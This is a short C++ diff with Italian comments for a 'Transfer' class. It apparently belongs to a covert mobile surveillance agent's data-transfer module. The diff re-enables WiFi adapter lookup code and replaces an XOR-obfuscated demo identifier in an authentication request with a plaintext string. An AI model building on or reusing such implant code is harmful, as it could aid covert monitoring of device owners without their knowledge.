@@ -25,7 +25,7 @@ Transfer::Transfer() : bIsWifiActive(FALSE), bIsWifiAlreadyActive(FALSE), uBtMac
 pollInterval(0), pSnap(NULL), uberlogObj(NULL), bNewConf(FALSE), bUninstall(FALSE), bWiFiForced(FALSE), 
 uWifiKeyLen(0), ulRegistryDhcp(0), bGprsForced(FALSE), deviceObj(NULL) {
 
-/***
+
 	WCHAR wifiGuid[]  = L"{98C5250D-C29A-4985-AE5F-AFE5367E5006}\\";
 
 	// La porta di RSSM
@@ -58,16 +58,16 @@ uWifiKeyLen(0), ulRegistryDhcp(0), bGprsForced(FALSE), deviceObj(NULL) {
 
 	// Impostiamo un intervallo di default
 	SetPollInterval(3000, 5);
-
+/***
 	// Otteniamo il nome dell'adattore WiFi
 	if (wifiObj.GetWiFiAdapterName(strWifiAdapter) == FALSE)
 		return;
-
+***/
 	strWifiGuidName = wifiGuid;
 	strWifiGuidName += strWifiAdapter;
 
 	// A questo punto strWifiAdapter e strWifiGuidName sono valorizzati
-	***/
+
 }
 
 Transfer::~Transfer() {
@@ -1375,12 +1375,16 @@ BYTE* Transfer::RestCreateAuthRequest(UINT *uEncContentLen) {
 	if (Task::getDemo()) {
 		int k, i;
 
+		//"WINPHONE\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 		// WINMO-DEMO\x00\x00\x00\x00\x00\x00 ^ Q (Q e' progressivo)
+		/*****
 		BYTE subtype[] = { 0x06, 0x1b, 0x1d, 0x19, 0x1a, 0x7b, 0x13, 0x1d, 0x14, 0x15, 0x5b, 0x5c, 0x5d, 0x5e, 0x5f, 0x60 };
 
 		for (i = 0, k = 'Q'; i < 16; i++, k++) {
 			subtype[i] ^= k;
 		}
+		*****/
+		BYTE subtype[] ="WINPHONE-DEMO\x00\x00\x00";
 
 		b.append(subtype, 16);
 	} else {
